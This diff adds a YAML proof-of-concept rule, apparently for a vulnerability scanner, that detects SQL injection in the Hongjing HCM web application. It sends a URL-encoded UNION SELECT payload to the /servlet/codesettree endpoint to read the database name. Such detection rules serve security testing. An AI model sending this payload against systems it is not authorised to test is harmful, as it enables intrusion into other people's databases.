@@ -1,0 +1,14 @@
+name: poc-yaml-hongjinghcm-sql
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: >-
+        /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
+      follow_redirects: false
+    expression: response.status == 200 && response.content_type.icontains("xml")
+expression: r0()
+detail:
+  author: hy
+#宏景HCMsql漏洞
